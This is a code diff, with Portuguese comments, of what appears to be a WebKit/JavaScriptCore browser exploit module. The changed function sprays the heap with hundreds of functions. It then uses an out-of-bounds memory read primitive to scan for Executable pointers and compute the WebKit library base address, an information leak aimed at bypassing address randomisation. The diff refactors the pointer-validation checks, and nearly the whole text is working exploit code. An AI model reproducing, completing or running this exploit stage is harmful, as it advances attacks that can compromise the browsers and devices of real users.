@@ -14,7 +14,7 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.31";
+const FNAME_MAIN = "ExploitLogic_v10.31"; // Mantido como v10.31 conforme o log
 
 const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_31";
 const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
@@ -96,7 +96,6 @@ export async function sprayAndInvestigateObjectExposure() {
         const NUM_SPRAY_FUNCS = 400; // Aumentar bastante
         for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
             sprayedFunctions.push(function(_a,_b,_c,_d,_e,_f,_g,_h,_i,_j) { // Função com mais argumentos para potencialmente aumentar tamanho do objeto FunctionExecutable
-                // CORREÇÃO: "0xFUNSPRAY" é um hexadecimal inválido. Substituído por um placeholder.
                 let x = 0xFACEFEED; return _a + i + x + _j;
             });
         }
@@ -119,47 +118,44 @@ export async function sprayAndInvestigateObjectExposure() {
         }
 
         for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
-            // Para cada cell_base_offset, o ponteiro para Executable estaria em cell_base_offset + executablePtrOffsetFromCell
-            // Usamos a primitiva de cópia para ler o QWORD que está nesse local.
             let potential_executable_ptr = await readFromOOBOffsetViaCopy(cell_base_offset + executablePtrOffsetFromCell);
 
-            // Verifique se potential_executable_ptr.isZero() existe em AdvancedInt64 ou substitua pela checagem de .low() e .high()
-            if (potential_executable_ptr && !potential_executable_ptr.isZero() && 
-                !(potential_executable_ptr.low() === 0xBADBAD && potential_executable_ptr.high() === 0xDEADDEAD) &&
-                !(potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD) ) {
-                
-                // Heurística para ponteiro Executable* (pode apontar para código JIT ou dados WebKit)
-                // Geralmente são ponteiros de heap válidos ou ponteiros para regiões de código.
-                if (potential_executable_ptr.high() !== 0 && (potential_executable_ptr.low() & 0x7) === 0) { // Alinhado e parte alta não nula
-                    logS3(`  [${toHex(cell_base_offset)}] Potencial JSFunction Cell. Valor em +${toHex(executablePtrOffsetFromCell)} (Potencial Executable*): ${potential_executable_ptr.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+            // CORREÇÃO: Substituir .isZero() pela checagem manual de .low() e .high()
+            // e garantir que é um AdvancedInt64Object antes de acessar .low()/.high()
+            if (potential_executable_ptr && isAdvancedInt64Object(potential_executable_ptr)) {
+                const isActuallyZero = potential_executable_ptr.low() === 0 && potential_executable_ptr.high() === 0;
+                const isErrorDeadBad = potential_executable_ptr.low() === 0xBADBAD && potential_executable_ptr.high() === 0xDEADDEAD;
+                const isErrorBad68 = potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD;
 
-                    // Tentar calcular a base do WebKit usando este ponteiro
-                    // Assumimos que o Executable* ou algo próximo a ele se relaciona com uma função conhecida.
-                    // O ideal seria se o Executable* fosse ele mesmo um ponteiro para uma função conhecida,
-                    // ou se a estrutura Executable contivesse um ponteiro para uma função conhecida.
-                    // Esta parte continua especulativa.
-                    for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
-                        const funcOffsetStr = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName];
-                        if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
-                        try {
-                            const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
-                            const potential_base_addr = potential_executable_ptr.sub(funcOffsetAdv);
+                if (!isActuallyZero && !isErrorDeadBad && !isErrorBad68) {
+                    // Heurística para ponteiro Executable* (pode apontar para código JIT ou dados WebKit)
+                    // Geralmente são ponteiros de heap válidos ou ponteiros para regiões de código.
+                    if (potential_executable_ptr.high() !== 0 && (potential_executable_ptr.low() & 0x7) === 0) { // Alinhado e parte alta não nula
+                        logS3(`  [${toHex(cell_base_offset)}] Potencial JSFunction Cell. Valor em +${toHex(executablePtrOffsetFromCell)} (Potencial Executable*): ${potential_executable_ptr.toString(true)}`, "leak", FNAME_CURRENT_TEST);
 
-                            if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && potential_base_addr.high() < 0x7FFF0000 ) {
-                                logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
-                                logS3(`      Ponteiro Executable* (lido de ${toHex(cell_base_offset + executablePtrOffsetFromCell)} via cópia): ${potential_executable_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
-                                logS3(`      Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
-                                logS3(`      Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
-                                document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
-                                webkitBaseLeaked = potential_base_addr;
-                                break; 
-                            }
-                        } catch (e_adv64) { /* Ignora */ }
+                        // Tentar calcular a base do WebKit usando este ponteiro
+                        for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
+                            const funcOffsetStr = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName];
+                            if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
+                            try {
+                                const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
+                                const potential_base_addr = potential_executable_ptr.sub(funcOffsetAdv);
+
+                                if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && potential_base_addr.high() < 0x7FFF0000 ) {
+                                    logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
+                                    logS3(`      Ponteiro Executable* (lido de ${toHex(cell_base_offset + executablePtrOffsetFromCell)} via cópia): ${potential_executable_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+                                    logS3(`      Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
+                                    logS3(`      Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+                                    document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
+                                    webkitBaseLeaked = potential_base_addr;
+                                    break; 
+                                }
+                            } catch (e_adv64) { /* Ignora */ }
+                        }
                     }
                 }
             }
             if (webkitBaseLeaked) break;
-            // CORREÇÃO: Usar cell_base_offset para o log de progresso
             if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 128) === 0) { 
                 logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}...`, "info", FNAME_CURRENT_TEST);
                 await PAUSE_S3(1); 
@@ -177,7 +173,7 @@ export async function sprayAndInvestigateObjectExposure() {
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MAIN} FALHOU!`;
     } finally {
-        sprayedFunctions = []; // Renomeado de sprayedObjects
+        sprayedFunctions = [];
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
